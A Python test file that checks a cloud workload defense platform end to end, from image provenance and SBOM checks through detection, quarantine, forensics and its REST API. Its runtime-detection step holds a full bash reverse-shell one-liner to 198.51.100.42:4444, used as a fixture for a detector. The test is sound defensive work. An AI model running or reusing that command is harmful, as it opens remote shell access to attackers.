"""
End-to-End System Tests for Phase 28.
Validates the complete 11-step lifecycle from Section 28.72:
Deployment -> Supply Chain -> Runtime Telemetry -> Anomaly Detection -> Identity Correlation ->
Digital Twin Blast Radius -> Non-destructive Quarantine -> Verification -> Forensic Snapshot -> API.
"""
import pytest
import time
from fastapi.testclient import TestClient

from phase_28_cloud_native_workload_defense import app
from supply_chain.images import ContainerImage, ContainerImageRepository
from supply_chain.sbom import SBOMPackage, SoftwareBillOfMaterials, SBOMManager
from supply_chain.signing import ImageSignerVerifier
from supply_chain.provenance import ProvenanceTracker
from kubernetes.workloads import K8sWorkload, K8sWorkloadRepository, WorkloadType
from runtime.telemetry import RuntimeEvent, RuntimeEventType
from runtime.detection import ContainerRuntimeDetector, FindingSeverity
from runtime.response import WorkloadResponseController, WorkloadQuarantineState, RuntimeResponseAction
from simulation.kubernetes import KubernetesTwinSimulator
from cloud.forensics import CloudForensicsManager, WorkloadEvidencePackage
from cloud.copilot import CloudSecurityCopilot


@pytest.fixture
def client():
    return TestClient(app)


def test_phase28_complete_11_step_lifecycle():
    """
    Executes the Section 28.72 End-to-End Scenario:
    WORKLOAD-991 running MTA-07.
    """
    # Step 1: Deployment & Provenance
    prov_tracker = ProvenanceTracker()
    img_repo = ContainerImageRepository()
    img = img_repo.get("IMG-MTA-241")
    assert img is not None
    prov = prov_tracker.get_provenance(img.provenance_id)
    assert prov is not None
    assert prov.slsa_level >= 3

    # Step 2: Supply-chain evaluation (SBOM check)
    sbom_mgr = SBOMManager()
    sbom = sbom_mgr.get_sbom(img.sbom_id)
    assert sbom is not None
    assert any("crypto" in p.name for p in sbom.packages)

    # Step 3: Runtime Anomaly & Detection
    detector = ContainerRuntimeDetector()
    anomalous_event = RuntimeEvent(
        event_id="EVT-REV-SHELL",
        workload_id="WORKLOAD-991",
        container_id="c-mta-worker-01",
        event_type=RuntimeEventType.PROCESS_SPAWNED,
        process_name="bash",
        cmdline="bash -i >& /dev/tcp/198.51.100.42/4444 0>&1",
        destination_ip="198.51.100.42",
        destination_port=4444,
        uid=1000,
    )
    findings = detector.inspect_event(anomalous_event)
    assert len(findings) >= 1
    assert any(f.category == "REVERSE_SHELL" and f.severity == FindingSeverity.CRITICAL for f in findings)

    # Step 4 & 5: Identity Context & Correlation
    copilot = CloudSecurityCopilot()
    risk_info = copilot.explain_workload_risk("WORKLOAD-991")
    assert risk_info["risk_rating"] == "HIGH"
    assert "SERVICE-91 assumes CLOUD-ROLE-22" in str(risk_info["factors"])

    # Step 6 & 7: Decision - High Risk triggered
    assert risk_info["recommended_action"] != ""

    # Step 8: Digital Twin Simulation before taking disruptive action
    k8s_twin = KubernetesTwinSimulator()
    workload = K8sWorkload(
        workload_id="WORKLOAD-991",
        name="mta-edge-relay",
        workload_type=WorkloadType.DEPLOYMENT,
        cluster_id="CLUSTER-PROD-01",
        namespace="email-ingress",
        image_tag=img.tag,
        image_digest=img.digest,
        replica_count=4,
    )
    sim_impact = k8s_twin.simulate_quarantine(workload)
    assert sim_impact.sla_impact == "DEGRADED"
    assert sim_impact.estimated_downtime_seconds == 0

    # Step 9: Approved Response - Non-destructive Quarantine
    response_ctrl = WorkloadResponseController()
    quar_record = response_ctrl.quarantine_workload(
        workload_id="WORKLOAD-991",
        reason="Reverse shell detected to 198.51.100.42:4444",
        action=RuntimeResponseAction.QUARANTINE_POD,
    )
    assert quar_record.current_state == WorkloadQuarantineState.QUARANTINED
    assert quar_record.network_isolated is True

    # Step 10: Verification & Forensic Snapshot
    forensics = CloudForensicsManager()
    snap = forensics.capture_snapshot(
        workload_id="WORKLOAD-991",
        image_digest=img.digest,
        configuration={"replicas": 4, "namespace": "email-ingress"},
        identity_context={"role": "CLOUD-ROLE-22", "sa": "sa-mta-pipeline"},
        network_context={"egress_isolated": True},
        runtime_state={"quarantined": True, "alert": "REVERSE_SHELL"},
    )
    assert len(snap.snapshot_sha256) == 64  # SHA256 hex string

    timeline = forensics.build_workload_timeline("WORKLOAD-991")
    pkg = WorkloadEvidencePackage(
        case_id="CASE-PHASE28-3001",
        workload_id="WORKLOAD-991",
        snapshot=snap,
        timeline=timeline,
        findings=[f.to_dict() for f in findings],
    )
    pkg_hash = pkg.finalize()
    assert len(pkg_hash) == 64

    # Step 11: Restoration once investigated
    restored = response_ctrl.restore_workload("WORKLOAD-991")
    assert restored.current_state == WorkloadQuarantineState.RESTORED
    assert restored.network_isolated is False


def test_fastapi_rest_endpoints(client):
    """Verify Section 28.70 Core REST endpoints."""
    # 1. Root & Status
    resp = client.get("/")
    assert resp.status_code == 200
    assert resp.json()["status"] == "OPERATIONAL"

    # 2. Cloud Resources
    resp = client.get("/api/v1/cloud/resources")
    assert resp.status_code == 200
    assert resp.json()["count"] >= 1

    # 3. Cloud Posture
    resp = client.get("/api/v1/cloud/posture")
    assert resp.status_code == 200
    assert "violations_count" in resp.json()

    # 4. Kubernetes Workloads
    resp = client.get("/api/v1/workloads")
    assert resp.status_code == 200
    assert resp.json()["count"] >= 1

    # 5. Workload Risk
    resp = client.get("/api/v1/workloads/WORKLOAD-991/risk")
    assert resp.status_code == 200
    assert resp.json()["risk_rating"] == "HIGH"

    # 6. Image Verification
    resp = client.post("/api/v1/images/forensic-api/verify")
    assert resp.status_code == 200
    assert resp.json()["verified"] is True
    assert resp.json()["status"] == "TRUSTED"

    # 7. Supply Chain Impact
    resp = client.get("/api/v1/supply-chain/impact/crypto")
    assert resp.status_code == 200
    assert resp.json()["total_affected_workloads"] >= 1

    # 8. Cloud Attack Paths
    resp = client.get("/api/v1/cloud/attack-paths?start=USER-1192&target=DATABASE-A")
    assert resp.status_code == 200
    assert resp.json()["paths_found"] >= 1

    # 9. Quarantine & Restore API
    resp = client.post("/api/v1/workloads/WORKLOAD-991/quarantine", json={"reason": "Test Anomaly"})
    assert resp.status_code == 200
    assert resp.json()["status"] == "QUARANTINED"

    resp = client.post("/api/v1/workloads/WORKLOAD-991/restore", json={"reason": "Test Clear"})
    assert resp.status_code == 200
    assert resp.json()["status"] == "RESTORED"

    # 10. Policy Simulation
    resp = client.post(
        "/api/v1/cloud/policy/simulate",
        json={"policy_name": "test-ingress-policy", "namespace": "email-ingress"},
    )
    assert resp.status_code == 200
    assert "verdict" in resp.json()
